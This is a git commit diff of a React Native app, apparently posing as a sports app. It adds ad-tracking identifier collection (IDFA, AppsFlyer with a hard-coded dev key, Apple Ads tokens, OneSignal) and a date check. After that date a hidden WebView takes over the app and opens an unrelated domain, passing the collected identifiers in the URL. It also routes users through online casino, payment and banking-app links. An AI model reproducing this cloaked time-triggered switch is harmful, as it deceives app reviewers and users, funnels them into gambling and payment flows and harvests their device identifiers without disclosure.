e92be49dc64b13f5ac2f657d84ddb4f99fa87c39
Maksym-Tykhonenko <maksym.tykhonenko88@gmail.com>
2024-09-05 15:03:35 +0300

    sss

--- App.js
+++ App.js
@@ -15,18 +15,258 @@ import {SportProvider} from './store/sport_context';
 import {useEffect, useRef, useState} from 'react';
 import {Animated, View} from 'react-native';
 import NationalSportsOrigenProdactScreen from './screen/NationalSportsOrigenProdactScreen';
+import ReactNativeIdfaAaid, {
+  AdvertisingInfoResponse,
+} from '@sparkfabrik/react-native-idfa-aaid';
+import AsyncStorage from '@react-native-async-storage/async-storage';
+import appsFlyer from 'react-native-appsflyer';
+import {LogLevel, OneSignal} from 'react-native-onesignal';
+import AppleAdsAttribution from '@hexigames/react-native-apple-ads-attribution';
 
 const Stack = createNativeStackNavigator();
 
 const App = () => {
   const [route, setRoute] = useState(true);
+  const [idfa, setIdfa] = useState();
+  console.log('idfa==>', idfa);
+  const [appsUid, setAppsUid] = useState(null);
+  const [sab1, setSab1] = useState();
+  const [pid, setPid] = useState();
+  console.log('appsUid==>', appsUid);
+  console.log('sab1==>', sab1);
+  console.log('pid==>', pid);
+  const [adServicesToken, setAdServicesToken] = useState(null);
+  //console.log('adServicesToken', adServicesToken);
+  const [adServicesAtribution, setAdServicesAtribution] = useState(null);
+  const [adServicesKeywordId, setAdServicesKeywordId] = useState(null);
+
+  useEffect(() => {
+    getData();
+  }, []);
+
+  useEffect(() => {
+    setData();
+  }, [
+    idfa,
+    appsUid,
+    sab1,
+    pid,
+    adServicesToken,
+    adServicesAtribution,
+    adServicesKeywordId,
+  ]);
+
+  const setData = async () => {
+    try {
+      const data = {
+        idfa,
+        appsUid,
+        sab1,
+        pid,
+        adServicesToken,
+        adServicesAtribution,
+        adServicesKeywordId,
+      };
+      const jsonData = JSON.stringify(data);
+      await AsyncStorage.setItem('App', jsonData);
+      //console.log('Дані збережено в AsyncStorage');
+    } catch (e) {
+      //console.log('Помилка збереження даних:', e);
+    }
+  };
+
+  const getData = async () => {
+    try {
+      const jsonData = await AsyncStorage.getItem('App');
+      if (jsonData !== null) {
+        const parsedData = JSON.parse(jsonData);
+        console.log('Дані дістаються в AsyncStorage');
+        console.log('parsedData in App==>', parsedData);
+        setIdfa(parsedData.idfa);
+        setAppsUid(parsedData.appsUid);
+        setSab1(parsedData.sab1);
+        setPid(parsedData.pid);
+        setAdServicesToken(parsedData.adServicesToken);
+        setAdServicesAtribution(parsedData.adServicesAtribution);
+        setAdServicesKeywordId(parsedData.adServicesKeywordId);
+      } else {
+        await fetchIdfa();
+        await requestOneSignallFoo();
+        await performAppsFlyerOperations();
+        await getUidApps();
+        await fetchAdServicesToken(); // Вставка функції для отримання токену
+        await fetchAdServicesAttributionData(); // Вставка функції для отримання даних
+
+        onInstallConversionDataCanceller();
+      }
+    } catch (e) {
+      console.log('Помилка отримання даних:', e);
+    }
+  };
+
+  //
+  //fetching AdServices token
+  const fetchAdServicesToken = async () => {
+    try {
+      const token = await AppleAdsAttribution.getAdServicesAttributionToken();
+      setAdServicesToken(token);
+      //Alert.alert('token', adServicesToken);
+    } catch (error) {
+      await fetchAdServicesToken();
+      //console.error('Помилка при отриманні AdServices токену:', error.message);
+    }
+  };
+
+  //fetching AdServices data
+  const fetchAdServicesAttributionData = async () => {
+    try {
+      const data = await AppleAdsAttribution.getAdServicesAttributionData();
+      const attributionValue = data.attribution ? '1' : '0';
+      setAdServicesAtribution(attributionValue);
+      setAdServicesKeywordId(data.keywordId);
+      //Alert.alert('data', data)
+    } catch (error) {
+      console.error('Помилка при отриманні даних AdServices:', error.message);
+    }
+  };
+
+  //////////////////////AppsFlyer
+  // 1ST FUNCTION - Ініціалізація AppsFlyer
+  const performAppsFlyerOperations = async () => {
+    try {
+      await new Promise((resolve, reject) => {
+        appsFlyer.initSdk(
+          {
+            devKey: 'rNzpXRjeUweji2s8zgJoT4',
+            appId: '6670246762',
+            isDebug: true,
+            onInstallConversionDataListener: true,
+            onDeepLinkListener: true,
+            timeToWaitForATTUserAuthorization: 10,
+          },
+          resolve,
+          reject,
+        );
+      });
+      console.log('App.js AppsFlyer ініціалізовано успішно');
+    } catch (error) {
+      console.log(
+        'App.js Помилка під час виконання операцій AppsFlyer:',
+        error,
+      );
+    }
+  };
+
+  // 2ND FUNCTION - Ottrimannya UID AppsFlyer
+  const getUidApps = async () => {
+    try {
+      const appsFlyerUID = await new Promise((resolve, reject) => {
+        appsFlyer.getAppsFlyerUID((err, uid) => {
+          if (err) {
+            reject(err);
+          } else {
+            resolve(uid);
+          }
+        });
+      });
+      console.log('on getAppsFlyerUID: ' + appsFlyerUID);
+      //Alert.alert('appsFlyerUID', appsFlyerUID);
+      setAppsUid(appsFlyerUID);
+    } catch (error) {
+      //console.error(error);
+    }
+  };
+
+  // 3RD FUNCTION - Отримання найменування AppsFlyer
+  const onInstallConversionDataCanceller = appsFlyer.onInstallConversionData(
+    res => {
+      try {
+        const isFirstLaunch = JSON.parse(res.data.is_first_launch);
+        if (isFirstLaunch === true) {
+          if (res.data.af_status === 'Non-organic') {
+            //const media_source = res.data.media_source;
+            //console.log('App.js res.data==>', res.data);
+
+            const {campaign, pid, af_adset, af_ad, af_os} = res.data;
+            setSab1(campaign);
+            setPid(pid);
+          } else if (res.data.af_status === 'Organic') {
+            //console.log('App.js res.data==>', res.data);
+            const {af_status} = res.data;
+            //console.log('This is first launch and a Organic Install');
+            setSab1(af_status);
+          }
+        } else {
+          //console.log('This is not first launch');
+        }
+      } catch (error) {
+        //console.log('Error processing install conversion data:', error);
+      }
+    },
+  );
+
+  //////////////////////OneSignall
+  // 253c1bea-a4e7-4d9c-ac22-a1c833b2b69f
+  const requestPermission = () => {
+    return new Promise((resolve, reject) => {
+      try {
+        OneSignal.Notifications.requestPermission(true);
+        resolve(); // Викликаємо resolve(), оскільки OneSignal.Notifications.requestPermission не повертає проміс
+      } catch (error) {
+        reject(error); // Викликаємо reject() у разі помилки
+      }
+    });
+  };
+
+  // Виклик асинхронної функції requestPermission() з використанням async/await
+  const requestOneSignallFoo = async () => {
+    try {
+      await requestPermission();
+      // Якщо все Ok
+    } catch (error) {
+      //console.log('err в requestOneSignallFoo==> ', error);
+    }
+  };
+
+  // Remove this method to stop OneSignal Debugging
+  OneSignal.Debug.setLogLevel(LogLevel.Verbose);
+
+  // OneSignal Initialization
+  OneSignal.initialize('253c1bea-a4e7-4d9c-ac22-a1c833b2b69f');
+
+  OneSignal.Notifications.addEventListener('click', event => {
+    //console.log('OneSignal: notification clicked:', event);
+  });
+  //Add Data Tags
+  OneSignal.User.addTag('key', 'value');
+
+  //////////////////////IDFA
+  const fetchIdfa = async () => {
+    try {
+      const res = await ReactNativeIdfaAaid.getAdvertisingInfo();
+      if (!res.isAdTrackingLimited) {
+        setIdfa(res.id);
+        //console.log('setIdfa(res.id);');
+      } else {
+        //console.log('Ad tracking is limited');
+        setIdfa(true); //true
+        //setIdfa(null);
+        fetchIdfa();
+        //Alert.alert('idfa', idfa);
+      }
+    } catch (err) {
+      //console.log('err', err);
+      setIdfa(null);
+      await fetchIdfa(); //???
+    }
+  };
 
   //////////////////////Route useEff
-  // terrific-cool-exhilaration.space
+  // astounding-exalted-ecstasy.space
   useEffect(() => {
-    const checkUrl = `https://reactnative.dev/`;
+    const checkUrl = `https://astounding-exalted-ecstasy.space/2wM7XvL3`;
 
-    const targetData = new Date('2024-09-01T10:00:00'); //дата з якої поч працювати webView
+    const targetData = new Date('2024-09-07T10:00:00'); //дата з якої поч працювати webView
     const currentData = new Date(); //текущая дата
 
     if (currentData <= targetData) {
@@ -54,17 +294,15 @@ const App = () => {
       return (
         <Stack.Navigator>
           <Stack.Screen
-            initialParams={
-              {
-                //idfa: idfa,
-                //sab1: sab1,
-                //pid: pid,
-                //uid: appsUid,
-                //adToken: adServicesToken,
-                //adAtribution: adServicesAtribution,
-                //adKeywordId: adServicesKeywordId,
-              }
-            }
+            initialParams={{
+              idfa: idfa,
+              sab1: sab1,
+              pid: pid,
+              uid: appsUid,
+              adToken: adServicesToken,
+              adAtribution: adServicesAtribution,
+              adKeywordId: adServicesKeywordId,
+            }}
             name="NationalSportsOrigenProdactScreen"
             component={NationalSportsOrigenProdactScreen}
             options={{headerShown: false}}
@@ -119,7 +357,7 @@ const App = () => {
   useEffect(() => {
     setTimeout(() => {
       setLouderIsEnded(true);
-    }, 8000);
+    }, 8500);
   }, []);
 
   return (
--- screen/NationalSportsOrigenProdactScreen.js
+++ screen/NationalSportsOrigenProdactScreen.js
@@ -1,11 +1,326 @@
-import React from 'react';
-import {View, Text} from 'react-native';
+import React, {useRef, useState, useEffect} from 'react';
+import {
+  View,
+  SafeAreaView,
+  TouchableOpacity,
+  Alert,
+  Linking,
+  Image,
+} from 'react-native';
+import {WebView} from 'react-native-webview';
+import DeviceInfo from 'react-native-device-info';
+import AsyncStorage from '@react-native-async-storage/async-storage';
 
-const NationalSportsOrigenProdactScreen = () => {
+const NationalSportsOrigenProdactScreen = ({navigation, route}) => {
+  const [idfa, setIdfa] = useState(route.params?.idfa);
+  console.log('route', route);
+  const [uid, setUid] = useState(route.params?.uid);
+  const [sab, setSab] = useState(route.params?.sab1);
+  const [pid, setPid] = useState(route.params?.pid);
+  const [adToken, setAdToken] = useState(route.params?.adToken);
+  const [adAtribution, setAdAtribution] = useState(route.params?.adAtribution);
+  const [adKeywordId, setAdKeywordId] = useState(route.params?.adKeywordId);
+  const refWebview = useRef(null);
+
+  const customSchemes = [
+    'scotiabank',
+    'bmoolbb',
+    'cibcbanking',
+    'conexus',
+    'rbcmobile',
+    'pcfbanking',
+    'tdct',
+    'blank',
+  ];
+
+  useEffect(() => {
+    getData();
+  }, []);
+
+  useEffect(() => {
+    setData();
+  }, [idfa, uid, sab, pid, adToken, adAtribution, adKeywordId]);
+
+  const setData = async () => {
+    try {
+      const data = {
+        idfa,
+        uid,
+        sab,
+        pid,
+        adToken,
+        adAtribution,
+        adKeywordId,
+      };
+      const jsonData = JSON.stringify(data);
+      await AsyncStorage.setItem(
+        'FishingTechniqueQuizOrigenProdactScreen',
+        jsonData,
+      );
+      console.log('Дані збережено в AsyncStorage');
+    } catch (e) {
+      console.log('Помилка збереження даних:', e);
+    }
+  };
+
+  const getData = async () => {
+    try {
+      const jsonData = await AsyncStorage.getItem(
+        'FishingTechniqueQuizOrigenProdactScreen',
+      );
+      if (jsonData !== null) {
+        const parsedData = JSON.parse(jsonData);
+        console.log('parsedData==>', parsedData);
+        setIdfa(parsedData.idfa);
+        setUid(parsedData.uid);
+        setSab(parsedData.sab);
+        setPid(parsedData.pid);
+        setAdToken(parsedData.adToken);
+        setAdAtribution(parsedData.adAtribution);
+        setAdKeywordId(parsedData.adKeywordId);
+      } else {
+      }
+    } catch (e) {
+      console.log('Помилка отримання даних:', e);
+    }
+  };
+
+  ////////////////////////////////
+  let baseUrl = `https://astounding-exalted-ecstasy.space/xFH9w8bd?advertising_id=${idfa}&uid=${uid}&adAtribution=${adAtribution}&adKeywordId=${adKeywordId}`;
+  let sabParts = sab ? sab.split('_') : [];
+  let additionalParams = sabParts
+    .map((part, index) => `sub_id_${index + 1}=${part}`)
+    .join('&');
+
+  const product = `${baseUrl}&${additionalParams}` + (pid ? `&pid=${pid}` : '');
+  console.log('My product Url==>', product);
+  //Alert.alert(product);
+
+  //// кастомний юзерагент
+  const deviceInfo = {
+    deviceBrand: DeviceInfo.getBrand(),
+    deviceId: DeviceInfo.getDeviceId(),
+    deviceModel: DeviceInfo.getModel(),
+    deviceSystemName: DeviceInfo.getSystemName(),
+    deviceSystemVersion: DeviceInfo.getSystemVersion(),
+  };
+
+  const customUserAgent = `Mozilla/5.0 (${deviceInfo.deviceSystemName}; ${deviceInfo.deviceModel}) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1`;
+  //const customUserAgent = `Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:91.0) Gecko/20100101 Firefox/91.0`;
+
+  //const userAgent = `Mozilla/5.0 (iPhone; CPU iPhone OS 14_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148`;
+  //const customUserAgent = `${userAgent} Safari/604.1`;
+  console.log(customUserAgent);
+
+  useEffect(() => {
+    WebView.userAgent = customUserAgent;
+  }, []);
+  ///////////////////////////
+
+  const [redirectUrl, setRedirectUrl] = useState(product);
+  const [checkNineUrl, setCheckNineUrl] = useState();
+  console.log('checkNineUrl====>', checkNineUrl);
+
+  const handleShouldStartLoad = event => {
+    const {url} = event;
+    //console.log('Should Start Load: ', url);
+    return true;
+  };
+
+  const handleNavigationStateChange = navState => {
+    const {url} = navState;
+    console.log('NavigationState: ', url);
+    //console.log('navState: ', navState);
+    if (
+      url.includes(
+        'https://api.paymentiq.io/paymentiq/api/piq-redirect-assistance',
+      )
+    ) {
+      setRedirectUrl(product);
+    } else if (url.includes('https://ninecasino')) {
+      setCheckNineUrl(product);
+    } else if (
+      url.includes('https://interac.express-connect.com/cpi?transaction=')
+    ) {
+      setRedirectUrl(product);
+    } else if (url.includes('about:blank') && checkNineUrl === product) {
+      refWebview.current.injectJavaScript(
+        `window.location.href = '${redirectUrl}'`,
+      );
+      console.log('xxxx');
+    } else if (
+      url.includes('neteller') ||
+      url.includes('rapidtransfer') ||
+      url.includes('skrill') ||
+      (url.includes('paysafecard') && checkNineUrl === product)
+    ) {
+      //Linking.openURL(url);
+      //return false;
+      return; // Дозволити навігацію для цих URL-адрес
+    }
+  };
+
+  const onShouldStartLoadWithRequest = event => {
+    const {url} = event;
+    console.log('onShouldStartLoadWithRequest: ', url);
+
+    if (url.startsWith('mailto:')) {
+      Linking.openURL(url);
+      return false;
+    } else if (url.startsWith('itms-appss://')) {
+      Linking.openURL(url);
+      return false;
+    } else if (
+      url.includes('bitcoin') ||
+      url.includes('litecoin') ||
+      url.includes('dogecoin') ||
+      url.includes('tether') ||
+      url.includes('ethereum') ||
+      url.includes('bitcoincash')
+    ) {
+      return false;
+    } else if (
+      url.startsWith('https://m.facebook.com/') ||
+      url.startsWith('https://www.facebook.com/') ||
+      url.startsWith('https://www.instagram.com/') ||
+      url.startsWith('https://twitter.com/') ||
+      url.startsWith('https://www.whatsapp.com/') ||
+      url.startsWith('https://t.me/') ||
+      url.includes('https://web.telegram')
+      //url.includes('pay.skrill.com')
+    ) {
+      Linking.openURL(url);
+      return false;
+    } else if (url.includes('pay.skrill.com') && checkNineUrl === product) {
+      console.log('Hello!!!!!!!!!!!!!!!!!!!!!');
+      Linking.openURL(url);
+      return false;
+    } else if (url === 'https://jokabet.com/') {
+      refWebview.current.injectJavaScript(
+        `window.location.href = '${redirectUrl}'`,
+      );
+      return false;
+    } else if (url === 'https://ninecasino.com/') {
+      refWebview.current.injectJavaScript(
+        `window.location.href = '${redirectUrl}'`,
+      );
+      return false;
+    } else if (url === 'https://bdmbet.com/') {
+      refWebview.current.injectJavaScript(
+        `window.location.href = '${redirectUrl}'`,
+      );
+      return false;
+    } else if (url === 'https://winspirit.app/?identifier=') {
+      refWebview.current.injectJavaScript(
+        `window.location.href = '${redirectUrl}'`,
+      );
+      return false;
+    } else if (url.includes('https://rocketplay.com/api/payments')) {
+      refWebview.current.injectJavaScript(
+        `window.location.href = '${redirectUrl}'`,
+      );
+      return false;
+    } else if (url.includes('secure.livechatinc.com/customer/action/')) {
+      //refWebview?.current?.goBack();
+      return false;
+    } else {
+      const scheme = url.split(':')[0];
+      if (customSchemes.includes(scheme)) {
+        Linking.canOpenURL(url)
+          .then(canOpen => {
+            if (canOpen) {
+              Linking.openURL(url).catch(error => {
+                console.warn(`Unable to open URL: ${url}`, error);
+              });
+            } else {
+              Alert.alert(`The ${scheme} app is not installed on your device.`);
+            }
+          })
+          .catch(error => {
+            console.warn(`Error checking if URL can be opened: ${url}`, error);
+          });
+        return false;
+      }
+    }
+
+    return true;
+  };
+
+  //ф-ція для повернення назад
+  const goBackBtn = () => {
+    if (refWebview && refWebview.current) {
+      refWebview?.current?.goBack();
+    }
+  };
+
+  //ф-ція для оновлення сторінки
+  const reloadPageBtn = () => {
+    if (refWebview && refWebview.current) {
+      refWebview?.current?.reload();
+    }
+  };
   return (
-    <View style={{flex: 1, alignItems: 'center', justifyContent: 'center'}}>
-      <Text>National Sports Origen Product Screen</Text>
-    </View>
+    <SafeAreaView style={{flex: 1, backgroundColor: '#191d24'}}>
+      <WebView
+        originWhitelist={[
+          '*',
+          'http://*',
+          'https://*',
+          'intent://*',
+          'tel:*',
+          'mailto:*',
+        ]}
+        onShouldStartLoadWithRequest={onShouldStartLoadWithRequest}
+        onNavigationStateChange={handleNavigationStateChange}
+        source={{
+          uri: product,
+        }}
+        textZoom={100}
+        allowsBackForwardNavigationGestures={true}
+        domStorageEnabled={true}
+        javaScriptEnabled={true}
+        allowsInlineMediaPlayback={true}
+        setSupportMultipleWindows={false}
+        mediaPlaybackRequiresUserAction={false}
+        allowFileAccess={true}
+        javaScriptCanOpenWindowsAutomatically={true}
+        style={{flex: 1}}
+        ref={refWebview}
+        userAgent={customUserAgent}
+      />
+
+      <View
+        style={{
+          flexDirection: 'row',
+          justifyContent: 'space-between',
+          marginBottom: -20,
+          paddingTop: 10,
+        }}>
+        {/**Btn back */}
+        <TouchableOpacity
+          style={{marginLeft: 40}}
+          onPress={() => {
+            goBackBtn();
+          }}>
+          <Image
+            style={{width: 30, height: 33}}
+            source={require('../assets/img/icons/arrow77.png')}
+          />
+        </TouchableOpacity>
+
+        {/**Btn reload */}
+        <TouchableOpacity
+          style={{marginRight: 40}}
+          onPress={() => {
+            reloadPageBtn();
+          }}>
+          <Image
+            style={{width: 30, height: 30}}
+            source={require('../assets/img/icons/redo77.png')}
+          />
+        </TouchableOpacity>
+      </View>
+    </SafeAreaView>
   );
 };
 
